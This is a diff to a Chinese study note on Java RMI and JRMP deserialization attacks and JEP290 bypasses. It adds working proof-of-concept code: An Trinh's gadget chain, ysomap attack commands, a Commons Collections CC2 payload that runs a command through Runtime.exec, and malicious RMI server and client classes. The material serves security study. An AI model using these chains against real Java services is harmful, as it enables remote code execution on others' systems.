@@ -1462,6 +1462,95 @@ jdk8u231与之前相比，在sun.rmi.transport.DGCImpl_Stub#dirty中新增了反
 
 An Trinh的绕过方法仍然和jdk8u141<=version<jdk<8u231下的攻击类似，但是他解决了两个问题，以绕过新的修复。一，我们发送的第一个恶意对象仍然可以正常反序列化，但是新增的异常检查阻止了后续代码的配合，我们无法发起JRMP请求，那是否可以找到一条链在反序列化时直接发起请求，无需与后续代码配合；二，第一次反序列化的恶意对象目的是发起一个dirty请求，现在dirty方法中新增了反序列化过滤器，但是第二次反序列化的本质是JRMP协议层面的反序列化，dirty只是诸多发起JRMP请求的其中一处入口，是否可以找到其他入口绕过dirty中新增的反序列化过滤器呢？
 
+##### 新的gadget链
+
+```java
+ObjID id = new ObjID(new Random().nextInt()); // RMI registry
+TCPEndpoint te = new TCPEndpoint(host, port);
+
+//1.UnicastRef对象 -> RemoteObjectInvocationHandler
+//obj是UnicastRef对象，先RemoteObjectInvocationHandler封装
+RemoteObjectInvocationHandler handler = new RemoteObjectInvocationHandler((RemoteRef) new UnicastRef(new LiveRef(id, te, false)));
+//2. RemoteObjectInvocationHandler -> RMIServerSocketFactory接口
+//RemoteObjectInvocationHandler通过动态代理封装转化成RMIServerSocketFactory
+RMIServerSocketFactory serverSocketFactory = (RMIServerSocketFactory) Proxy.newProxyInstance(
+    RMIServerSocketFactory.class.getClassLoader(),// classloader
+    new Class[] { RMIServerSocketFactory.class, Remote.class}, // interfaces to implements
+    handler// RemoteObjectInvocationHandler
+);
+//通过反射机制破除构造方法的可见性性质，创建UnicastRemoteObject实例
+Constructor<?> constructor = UnicastRemoteObject.class.getDeclaredConstructor(null); // 获取默认的
+constructor.setAccessible(true);
+UnicastRemoteObject remoteObject = (UnicastRemoteObject) constructor.newInstance(null);
+//3. RMIServerSocketFactory -> UnicastRemoteObject
+//把RMIServerSocketFactory塞进UnicastRemoteObject实例中
+setFieldValue(remoteObject, "ssf", serverSocketFactory);
+```
+
+这里整个反序列化链就不再分析，可以参考文章[Trinhs RMI 注册表旁路 |MOGWAI 实验室 (mogwailabs.de)](https://mogwailabs.de/en/blog/2020/02/an-trinhs-rmi-registry-bypass/)
+
+##### 对于lookup函数的再次改造
+
+这里需要对之前的lookup函数再进行一些改造
+
+```java
+ public static void lookup(Registry registry,Object var1) throws AccessException, NotBoundException, RemoteException {
+        try {
+
+            Operation[] operations = new Operation[]{new Operation("void bind(java.lang.String, java.rmi.Remote)"), new Operation("java.lang.String list()[]"), new Operation("java.rmi.Remote lookup(java.lang.String)"), new Operation("void rebind(java.lang.String, java.rmi.Remote)"), new Operation("void unbind(java.lang.String)")};
+
+            RemoteRef ref = (RemoteRef) Reflections.getFieldValue(registry,"ref");
+            StreamRemoteCall var2 = (StreamRemoteCall)ref.newCall((java.rmi.server.RemoteObject)registry, operations, 2, 4905912898345647071L);
+
+            try {
+                ObjectOutput var3 = var2.getOutputStream();
+                // 新增语句
+                Reflections.setFieldValue(var3,"enableReplace",false);
+                var3.writeObject(var1);
+
+            } catch (IOException var15) {
+                throw new MarshalException("error marshalling arguments", var15);
+            }
+            ref.invoke(var2);
+        } catch (RuntimeException var16) {
+            throw var16;
+        } catch (RemoteException var17) {
+            throw var17;
+        } catch (NotBoundException var18) {
+            throw var18;
+        } catch (Exception var19) {
+            throw new UnexpectedException("undeclared checked exception", var19);
+        }
+    }
+```
+
+##### 使用ysomap进行攻击
+
+```shell
+# ysomap的脚本
+# 开一个恶意的JRMP服务端，这里使用CB链进行攻击，确保目标的java版本和依赖库支持
+use exploit RMIListener
+use payload CommonsBeanutils1
+use bullet TemplatesImplBullet
+set lport 1099
+set body "open -a Calculator"
+run
+
+# 使用恶意payload攻击目标使其连接我们的恶意JRMP服务端
+use exploit RMIRegistryExploit
+use payload RMIConnectWithUnicastRemoteObject
+set target ip:port
+set rhost 127.0.0.1
+set rport 1098
+run
+```
+
+#### jdk8u241之后的修复
+
+##### 第一处修复
+
+##### 第二处修复
+
 ### 对JRMP客户端的反序列化攻击（RMI client暂未发现版本限制，DGC在jdk8u231后存在过滤器）
 
 首先辨析一下JRMP协议的客户端和RMI的Client，这两者是不同的概念。JRMP的客户端指的是通过JRMP协议主动发起请求的一方（包括RMI和DGC中主动请求的一方），而RMI的client则是从register获取server的stun，然后进行远程方法调用的一方。
@@ -1492,7 +1581,9 @@ java -cp ysoserial-all.jar ysoserial.exploit.JRMPListener 127.0.0.1 1099 Commons
 
 ### 对于RMI的Client的反序列化攻击
 
-#### Client接受Register返回的非异常对象的反序列化攻击
+#### Client接受Register返回的非异常对象的反序列化攻击（jdk8u241后仍可用）
+
+首先说明这里为什么要强调非异常对象，如果Register返回的是异常对象，那就会如之前所分析，进入了JRMP层的反序列化。
 
 回到RegisterImpl_Stun的lookup、list这两个方法上来。这两个方法在RMI的Client侧调用，在利用lookup攻击Register时，我们重写了它，以实现利用writeObject序列化恶意对象后攻击Register，然而稍加留意可以发现，这两个方法中也存在readObject的调用（bind、rebind和unbind没有，所以server不会受到register返回的非异常对象的攻击），那是否意味着它们也存在反序列化攻击的风险呢？
 
@@ -1541,43 +1632,287 @@ case 1:
 
 很显然，这里我们没有办法控制var6.list()返回恶意对象完成对于客户端的攻击，所以我们得手动实现一个Register侧的服务，在客户端list调用时返回恶意对象。
 
-这里我们可以参考，ysoserial的ysoserial.exploit.JRMPListener的代码实现，该模块是针对JRMP的客户端进行攻击(JRMP客户端是指JRMP协议发起请求的一方，和RMI的client不是一个概念)。
+这里我们可以参考，ysoserial的ysoserial.exploit.JRMPListener的代码实现，该模块是针对JRMP的客户端进行攻击，但是前文分析过程中，有一个switch语句来判断传输的对象是异常对象还是非异常对象，如果是异常对象就在JRMP层反序列化，是正常对象就回到RMI层反序列化。
 
-#### Client作为DGC客户端的反序列化攻击
+我们可以将ysoserial.exploit.JRMPListener代码稍作更改，在RMI层反序列化
 
-回到DGCImpl_Stub的dirty和clean这两个方法上来
+```java
+// doCall
+// ......
+// 在JRMP层反序列化
+oos.writeByte(TransportConstants.ExceptionalReturn);
+// 在RMI层反序列化
+// oos.writeByte(TransportConstants.NormalReturn)
+// ......
+```
 
-#### Client接收Server返回对象的反序列化攻击
+分析完后可以看出，这个攻击方法相对于直接在JRMP层反序列化较为鸡肋。
+
+#### Client作为DGC客户端的反序列化攻击（jdk8u121之前）
+
+和前面一样，这里也是非异常对象时才进入DGC层，和前面一样与JRMP层的攻击相比比较鸡肋，这里大致了解一下即可。
+
+回到DGCImpl_Stub的dirty这个方法上来：
+
+```java
+    public Lease dirty(ObjID[] var1, long var2, Lease var4) throws RemoteException {
+        try {
+            RemoteCall var5 = super.ref.newCall(this, operations, 1, -669196253586618813L);
+
+            try {
+                ObjectOutput var6 = var5.getOutputStream();
+                var6.writeObject(var1);
+                var6.writeLong(var2);
+                var6.writeObject(var4);
+            } catch (IOException var20) {
+                throw new MarshalException("error marshalling arguments", var20);
+            }
+
+            super.ref.invoke(var5);
+
+            Lease var24;
+            try {
+                ObjectInput var9 = var5.getInputStream();
+                // 反序列化点
+                var24 = (Lease)var9.readObject();
+            } catch (IOException var17) {
+                throw new UnmarshalException("error unmarshalling return", var17);
+            } catch (ClassNotFoundException var18) {
+                throw new UnmarshalException("error unmarshalling return", var18);
+            } finally {
+                super.ref.done(var5);
+            }
+
+            return var24;
+        } catch (RuntimeException var21) {
+            throw var21;
+        } catch (RemoteException var22) {
+            throw var22;
+        } catch (Exception var23) {
+            throw new UnexpectedException("undeclared checked exception", var23);
+        }
+    }
+```
+
+这里利用的话，需要构建一个恶意的DGC服务端，和前面对client一样改造ysoserial.exploit.JRMPListener即可。
+
+#### Client接收Server返回对象的反序列化攻击（jdk8u241后仍可用）
+
+##### 示例代码
+
+攻击方法非常简单，server端返回一个恶意的对象即可。
+
+测试的时候注意设置server的JVM参数，-Djava.rmi.server.hostname=，不然client有可能收不到正确的server ip
+
+```java
+// register
+import java.rmi.RemoteException;
+import java.rmi.registry.LocateRegistry;
+import java.rmi.registry.Registry;
+
+public class Register {
+    public static void main(String[] args) throws RemoteException, InterruptedException {
+        Registry registry =  LocateRegistry.createRegistry(1099);
+        System.out.println("RMI registry started on port 1099");
+
+        // 保持程序运行
+        synchronized (Register.class) {
+            Register.class.wait();
+        }
+    }
+}
+
+// server
+import java.rmi.Remote;
+
+public interface ReturnObj extends Remote {
+    public Object returnObj() throws Exception;
+}
+
+
+import org.example.payload.CC2;
+import org.example.remoteInterface.ReturnObj;
+import java.rmi.AlreadyBoundException;
+import java.rmi.RemoteException;
+import java.rmi.registry.LocateRegistry;
+import java.rmi.registry.Registry;
+import java.rmi.server.UnicastRemoteObject;
+
+public class ReturnObjServer extends UnicastRemoteObject implements ReturnObj {
+    public ReturnObjServer() throws RemoteException {}
+    @Override
+    public Object returnObj() throws Exception {
+        return CC2.getObject();
+    }
+
+    public static void main(String[] args) throws RemoteException, AlreadyBoundException {
+        ReturnObjServer returnObjServer = new ReturnObjServer();
+        String host = "127.0.0.1";
+        int port = 1099;
+        Registry registry = LocateRegistry.getRegistry(host, port);
+        registry.bind("returnObjServer",returnObjServer);
+    }
+}
+
+// client
+import org.example.remoteInterface.ReturnObj;
+import java.rmi.registry.LocateRegistry;
+import java.rmi.registry.Registry;
+
+public class WeakClient {
+    public static void main(String[] args) throws Exception {
+        Registry registry = LocateRegistry.getRegistry("localhost", 1099);
+
+        ReturnObj returnObj = (ReturnObj) registry.lookup("returnObjServer");
+
+        Object object = returnObj.returnObj();
+    }
+}
+
+// CC2
+import org.apache.commons.collections4.Transformer;
+import org.apache.commons.collections4.comparators.TransformingComparator;
+import org.apache.commons.collections4.functors.ChainedTransformer;
+import org.apache.commons.collections4.functors.ConstantTransformer;
+import org.apache.commons.collections4.functors.InvokerTransformer;
+import java.io.ByteArrayInputStream;
+import java.io.ByteArrayOutputStream;
+import java.io.ObjectInputStream;
+import java.io.ObjectOutputStream;
+import java.lang.reflect.Field;
+import java.util.Comparator;
+import java.util.PriorityQueue;
+
+public class CC2 {
+    public static void setFieldValue(Object obj, String fieldName, Object
+            value) throws Exception {
+        Field field = obj.getClass().getDeclaredField(fieldName);
+        field.setAccessible(true);
+        field.set(obj, value);
+    }
+    public static Object getObject() throws Exception {
+        Transformer[] fakeTransformers = new Transformer[] {new
+                ConstantTransformer(1)};
+        Transformer[] transformers = new Transformer[] {
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer("getMethod", new Class[] {
+                        String.class,
+                        Class[].class }, new Object[] { "getRuntime",
+                        new Class[0] }),
+                new InvokerTransformer("invoke", new Class[] {
+                        Object.class,Object[].class }, new Object[] { null, new
+                        Object[0] }),
+                new InvokerTransformer("exec", new Class[] { String.class
+                },
+                        new String[] { "calc.exe" }),
+        };
+        Transformer transformerChain = new
+                ChainedTransformer(fakeTransformers);
+        Comparator comparator = new
+                TransformingComparator(transformerChain);
+        PriorityQueue queue = new PriorityQueue(2, comparator);
+        queue.add(1);
+        queue.add(2);
+        setFieldValue(transformerChain, "iTransformers", transformers);
+
+        return queue;
+    }
+
+    public static void main(String[] args) throws Exception {
+        ByteArrayOutputStream barr = new ByteArrayOutputStream();
+        ObjectOutputStream oos = new ObjectOutputStream(barr);
+        oos.writeObject(getObject());
+        oos.close();
+        System.out.println(barr);
+        ObjectInputStream ois = new ObjectInputStream(new
+                ByteArrayInputStream(barr.toByteArray()));
+        Object o = (Object)ois.readObject();
+    }
+}
+```
+
+##### server的序列化点（TODO）
+
+待补充
+
+##### client的反序列化点
+
+以这里示例CC5进行攻击为例，在CC5反序列化的对象PriorityQueue的readObject方法处打上断点，调试程序
+
+![image-20240904171115082](./images/image-20240904171115082.png)
+
+![image-20240904171228041](./images/image-20240904171228041.png)
+
+注意UnicastRef#invoke中也调用了executeCall这个函数，前面JRMP客户端攻击的时候分析过，这会进入JRMP层，所以这里也容易收到JRMP层的反序列化攻击
+
+![image-20240904172157429](./images/image-20240904172157429.png)
 
 ### 对于RMI的Server的反序列化攻击
 
-#### Server作为DGC服务端的反序列化攻击
+#### Server作为DGC服务端的反序列化攻击（同Register DGC层）
 
 和Register作为DGC服务端完全相同
 
-#### Server接受Client远程调用参数的反序列化攻击
+#### Server接受Client远程调用参数的反序列化攻击（jdk8u241以后仍可用）
 
+##### 示例代码
 
+代码示例，攻击方式也很简单，client调用远程方法时传递恶意参数即可
 
-* Register攻击Client
-  * reference
+```java
+// 恶意客户端代码，CC2.getObject()返回恶意对象
+import org.example.payload.CC2;
+import org.example.remoteInterface.GetAnytypeParams;
+import java.rmi.registry.LocateRegistry;
+import java.rmi.registry.Registry;
 
-* Server攻击Client
-* Client攻击Server
+public class EvilClient {
+    public static void main(String[] args) throws Exception {
+        Registry registry = LocateRegistry.getRegistry("192.168.110.146", 1099);
+
+        GetAnytypeParams getAnytypeParams = (GetAnytypeParams) registry.lookup("getobjectServer");
+
+        Object object = getAnytypeParams.getAnytypeParams(CC2.getObject());
+    }
+}
+
+// register
+import java.rmi.RemoteException;
+import java.rmi.registry.LocateRegistry;
+import java.rmi.registry.Registry;
+
+public class Register {
+    public static void main(String[] args) throws RemoteException, InterruptedException {
+        Registry registry =  LocateRegistry.createRegistry(1099);
+        System.out.println("RMI registry started on port 1099");
+
+        // 保持程序运行
+        synchronized (Register.class) {
+            Register.class.wait();
+        }
+    }
+}
+```
+
+##### server的反序列化点（TODO）
+
+##### client的序列化点（TODO）
 
 ### 动态加载类攻击
 
-对于register的攻击(reference)
+#### 对于register的攻击(JNDI注入)TODO
 
-#### 对于server的攻击
+#### 对于server的攻击（利用codebase）
 
-#### 对于client的攻击
+#### 对于client的攻击（利用codebase）
 
-## 补充
+## 补充（TODO）
 
-* 关于为了通过bind等方法的参数检查而采取的动态代理包装的问题：动态代理包装是否可以自定义（被攻击者没有），它为什么可以过JEP290
+* 关于为了通过bind等方法的参数检查而采取的动态代理包装的问题：动态代理包装是否可以自定义（被攻击者没有该类），它为什么可以过JEP290
 * JRMPClient发起DGC请求的过程分析
 * jdk8u231后DGC客户端的限制
+* jdk8u231后的利用链分析
+* 为什么jdk8u231后的lookup要进行修改，增加`Reflections.setFieldValue(var3,"enableReplace",false);`
 
 ## 回显马的编写
 
@@ -1586,4 +1921,15 @@ case 1:
 ## Ysoserial的RMI相关payload分析
 
 ## 参考
+
+* https://paper.seebug.org/1091/
+* [一次攻击内网rmi服务的深思 (codersec.net)](https://www.codersec.net/2018/09/一次攻击内网rmi服务的深思/)
+* [由浅入深RMI安全 - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/web/324692.html)
+* [针对RMI服务的九重攻击 - 上 - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/7930?time__1311=n4%2BxnD0DyDu730KK40HpADR0Dcmm13DgirYD&u_atoken=94efaa4898ee2e0ab761121cba454999&u_asession=01Fu4pMlk-GmfvC7Knkk222z2BeQPdyZAowrs32a6fFyw_PhSHEFZeMVUY6JYX2vb5JB-YY_UqRErInTL5mMzm-GyPlBJUEqctiaTooWaXr7I&u_asig=05_GgaQvzEB7zO7EbJWoJwGcmNta3X97A9O7ULkw0sV3zOWWuy0lpmkiUAgKTexJFaY6IkhBxoUPYwrGA7V7bv4sN81o_D9tdd4JMBR3l_SnQaFB9MUJv0dNMi-6m1rVNVswxPIJsUlVCgI-RFN5fgki3HIEy1mwtSCYCZ-0bbwcDBzhvSc0Kr8URjOX9Xe4tkcagRx2bZVyIgXq4Kbi-1YfujrXhwMQrtelSRqyqUs-2YGp00FM-Zw3GyrO5hPvUChXVyg8Py7SsCIvJ1wi5QiY8KNy6JoOjsoWf5AIB-DkR6gx6UxFgdF3ARCQ86jS_u_XR5hatHQVh06VuUZ-D1wA&u_aref=kKU%2BOjTsgipLZnjwyRrGf%2F%2F44Gc%3D#toc-16)
+* [JAVA RMI反序列化知识详解-安全客 - 安全资讯平台 (anquanke.com)](https://www.anquanke.com/post/id/204740#h3-9)
+* [针对RMI服务的九重攻击 - 下 - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/7932?time__1311=n4%2BxnD0DyDu730KGQDCDlhjepQxfxxxYvqPN%3Dx#toc-4)
+* [搞懂RMI、JRMP、JNDI-终结篇 - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/7264?u_atoken=66db4a29790194af946085e31d265954&u_asession=01Z102eTx-uSlLuAwi0dCOfTlZ1DAFIHNiE6_eOZYhv7v4Ca4wEAWF7mOysAqiJeUnJB-YY_UqRErInTL5mMzm-GyPlBJUEqctiaTooWaXr7I&u_asig=05vF4wabVJwBU0xI2oZn8lp8jaeCvPiy6h51Bf3ExTnarCKPiuyhsRzLohQ7J59WbYPlR19W0CvSTFgSipF_qAhfwBAxgh7ePszgE7Ts8nKZRdCEdz9GH1cMwgEMPkZfLpPwk273ZJHVT0M7dEYHd62EO6vkDvdNuvmpmKgYl3mjvBzhvSc0Kr8URjOX9Xe4tkczwPXd8IUf5OjAcGuKlUcbcq5No9LJZRZv93uLQFxxLwdfXLcRCQaymMSmIYnf9A-S3eRSGCThYuwFP9qLJ1uNnEZmbKI6afDLEq7lsGo1R6gx6UxFgdF3ARCQ86jS_u_XR5hatHQVh06VuUZ-D1wA&u_aref=KJw%2F7%2BnrtKA4gzj11QEfHsZKcnI%3D&time__1311=n4%2BxcD0Dgi0%3DGQDCD9lDlhjU57IKRob2wTTD#toc-0)
+* [JAVA RMI 反序列化攻击 & JEP290 Bypass分析 - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/8706?time__1311=n4%2BxnD0DcDu0eD5Y40HpDUxYqqsDgGx7w9vxPhD#toc-15)
+* [Java安全之RMI反序列化 - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/9053?time__1311=n4%2BxnD0DuAiti%3DGkD9D0x05Sb%2BDOWr%3DKTee%3Dvk4D#toc-2)
+* [code2sec.com/CVE-2017-3241 Java RMI Registry.bind()反序列化漏洞.md at master · bit4woo/code2sec.com (github.com)](https://github.com/bit4woo/code2sec.com/blob/master/CVE-2017-3241 Java RMI Registry.bind()反序列化漏洞.md)
 
